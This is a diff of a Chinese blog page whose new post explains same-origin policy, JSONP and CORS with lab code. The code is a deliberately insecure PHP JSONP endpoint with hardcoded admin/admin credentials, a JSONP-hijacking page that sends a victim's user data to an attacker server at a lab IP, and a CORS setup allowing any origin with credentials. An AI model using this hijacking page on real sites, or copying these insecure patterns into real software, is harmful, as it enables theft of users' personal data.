@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>阿杰的小站</title>
+    <title>跨域实现-jsonp和CORS · 阿杰的小站</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >阿杰的小站</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">跨域实现-jsonp和CORS</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>阿杰的小站</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            跨域实现-jsonp和CORS
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/08/23</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,53 +399,68 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/05/21/Beautifulsoup解析/" >
-            
-                <span>BeautifulSoup解析</span>
-        </a>
-        <div class="abstract-content">
-            概念一个节点可以由5个部分来概括
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="同源策略-SOP"><a href="#同源策略-SOP" class="headerlink" title="同源策略(SOP)"></a>同源策略(SOP)</h2><p>同源策略限制了同一个源于另一个源的脚本交互。<br>一般同源策略必须满足三个条件：</p>
+<blockquote>
+<p>1、协议相同<br>2、域名相同<br>3、端口相同</p>
+</blockquote>
+<h2 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h2><p>许多html标签都能够跨域发出请求，如：img、a、script等，jsonp就是利用了script标签src属性的特性进行动态获取json数据。<br>jsonp客户端需要写一个函数，称为回调函数，通过服务器端触发调用，参数为所传递的json数据，服务器端返回明文如<code>jsonp({&#39;id&#39;:1,&#39;name&#39;:&#39;kage&#39;})</code>的调用字符串。</p>
+<p>具体看代码：<br>用户登录验证：<br>只有登录才能访问该jsonp接口，一定程度防止越权访问，所以需要csrf来触发。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$name = $_GET[&apos;name&apos;];</span><br><span class="line"></span><br><span class="line">$pwd = $_GET[&apos;pwd&apos;];</span><br><span class="line"></span><br><span class="line">if ($name === &apos;admin&apos; &amp;&amp; $pwd === &apos;admin&apos; || $name === &apos;guest&apos; &amp;&amp; $pwd === &apos;guest&apos;) &#123;</span><br><span class="line"></span><br><span class="line">	$_SESSION[&apos;name&apos;] = $name;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;a&gt;用户信息&lt;/a&gt;&lt;br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;a&gt;退出登录&lt;/a&gt;&lt;br data-tomark-pass&gt;&apos;;</span><br><span class="line"></span><br><span class="line">if (!$_SESSION[&apos;name&apos;]) &#123;</span><br><span class="line"></span><br><span class="line">	echo &apos;&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;登录&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;login.php&quot; method=&quot;get&quot;&gt;</span><br><span class="line"></span><br><span class="line">用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span><br><span class="line"></span><br><span class="line">密码：&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;login&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">	echo &quot;欢迎您&quot; . $_SESSION[&apos;name&apos;] . &quot;&lt;br data-tomark-pass&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>服务器端：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$callback = $_GET[&apos;callback&apos;];</span><br><span class="line"></span><br><span class="line">if ($_SESSION[&apos;name&apos;] === &apos;admin&apos;) &#123;</span><br><span class="line"></span><br><span class="line">	echo $callback . &quot;(&#123;&apos;id&apos;:1,&apos;name&apos;:&apos;missfresh_admin&apos;&#125;)&quot;;</span><br><span class="line"></span><br><span class="line">&#125; elseif ($_SESSION[&apos;name&apos;] === &apos;guest&apos;) &#123;</span><br><span class="line"></span><br><span class="line">	echo $callback . &quot;(&#123;&apos;id&apos;:2,&apos;name&apos;:&apos;missfresh_guest&apos;&#125;)&quot;;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">	echo $callback . &quot;获取个人信息失败&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>构造csrf恶意网站，发送请求到该jsonp接口，劫取用户信息到我们服务器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;jsonp劫持&lt;/title&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function jsonp_hack(v)&#123;</span><br><span class="line">alert(&quot;jsonp劫持&quot;);</span><br><span class="line">var h=&apos;&apos;;</span><br><span class="line">for(var key in v)&#123;</span><br><span class="line">var a=&apos;&apos;</span><br><span class="line">a=key+&apos; : &apos;+v[key]+&apos; ,&apos;</span><br><span class="line">h+=a</span><br><span class="line">&#125;</span><br><span class="line">alert(h);</span><br><span class="line">$.get(&apos;http://192.168.169.149/get.php?value=&apos;+h);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://192.168.1.6/t/823/message.php?callback=jsonp_hack&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;jsonp劫持&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="jsonp劫持原理"><a href="#jsonp劫持原理" class="headerlink" title="jsonp劫持原理"></a>jsonp劫持原理</h3><p>用户点击攻击者链接，通过script标签访问jsonp接口，jsonp回调函数处理取得的json数据，将数据变为字符串，通过ajax发送到攻击者服务器，达到窃取用户个人信息的目的。</p>
+<h2 id="CORS跨域请求"><a href="#CORS跨域请求" class="headerlink" title="CORS跨域请求"></a>CORS跨域请求</h2><p>简单说就是，AJAX的跨域请求化。<br>CORS客户端浏览器都支持，主要需要服务器端返回头的支持。<br>浏览器会判断返回包AC验证字段来决定是否拦截请求。<br>关键字段如下：</p>
+<blockquote>
+<p>Access-Control-Allow-Origin：指定客户端哪些域能访问我的资源<br>Access-Control-Allow-Credentials：浏览器是否发送cookie<br>Access-Control-Allow-Methods：指定可以使用哪些HTTP请求方法，比较少</p>
+</blockquote>
+<p>CORS实现：</p>
+<blockquote>
+<p>请求头把所在域添加到Origin中<br>服务器添加Access-Control-Allow-Origin，返回结果<br>浏览器比较Origin和ACAO，如果获得授权，将结果返回给页面</p>
+</blockquote>
+<p>实战：<br>server.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">header(&apos;Access-Control-Allow-Origin: *&apos;);</span><br><span class="line"></span><br><span class="line">header(&apos;Access-Control-Allow-Credentials: true&apos;);</span><br><span class="line"></span><br><span class="line">$a = !empty($_GET[&apos;a&apos;]) ? trim($_GET[&apos;a&apos;]) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if ($a == &apos;getUserInfo&apos;) &#123;</span><br><span class="line"></span><br><span class="line">	echo json_encode(array(</span><br><span class="line"></span><br><span class="line">		&apos;uid&apos; =&gt; 1,</span><br><span class="line"></span><br><span class="line">		&apos;name&apos; =&gt; &apos;测试&apos;,</span><br><span class="line"></span><br><span class="line">	));</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">	echo &apos;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>user.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html lang=&quot;zh-cn&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;cors-test&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div &gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line"></span><br><span class="line">var url = &quot;http://192.168.169.149/server.php&quot;;</span><br><span class="line"></span><br><span class="line">$.get(url, &#123;a:&quot;getUserInfo&quot;&#125;, function(data) &#123;</span><br><span class="line"></span><br><span class="line">alert(data.name)</span><br><span class="line"></span><br><span class="line">&#125;, &quot;json&quot;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>浅谈跨域威胁与安全：<br><a href="https://www.freebuf.com/articles/web/208672.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/208672.html</a></p>
 
-节点名
-节点内容
-子节点
-父亲节点
-属性
-
-所以我们主要围绕两个问题：
-
-如何获得相应节点
-如何从该节点获得我们需要的信息
-
-获得节点soup.p：获得第一个p标签节点soup.find_all(&quot;p&quot;)：获得所有p标签节点组成的listsoup.find(id=&quot;link3&quot;)：通过id选择器获得指定节点
-获得信息soup.p.name：获得节点名soup.p.text：获得节点文字内容包含子节点soup.p.string：获得节点文字内容soup.p[&quot;class&quot;]：获得属性内容soup...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/21</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "编程">编程</a>
-    
-</div>
-            
-        </div>
     </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">Kage</a>
+            <p>原文链接：<a href="http://yoursite.com/2019/08/23/跨域实现-jsonp和CORS/">http://yoursite.com/2019/08/23/跨域实现-jsonp和CORS/</a>
+            <p>发表日期：<a href="http://yoursite.com/2019/08/23/跨域实现-jsonp和CORS/">八月 23日 2019, 11:50:43 晚上</a>
+            <p>更新日期：<a href="http://yoursite.com/2019/08/23/跨域实现-jsonp和CORS/">August 23rd 2019, 11:52:39 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/08/23/sqli-labs 通关1/" title= "sqli-labs 通关1">
+                    <div class="prevTitle">sqli-labs 通关1</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -466,6 +542,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#同源策略-SOP"><span class="toc-number">1.</span> <span class="toc-text">同源策略(SOP)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jsonp"><span class="toc-number">2.</span> <span class="toc-text">jsonp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jsonp劫持原理"><span class="toc-number">2.1.</span> <span class="toc-text">jsonp劫持原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS跨域请求"><span class="toc-number">3.</span> <span class="toc-text">CORS跨域请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -957,6 +1051,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
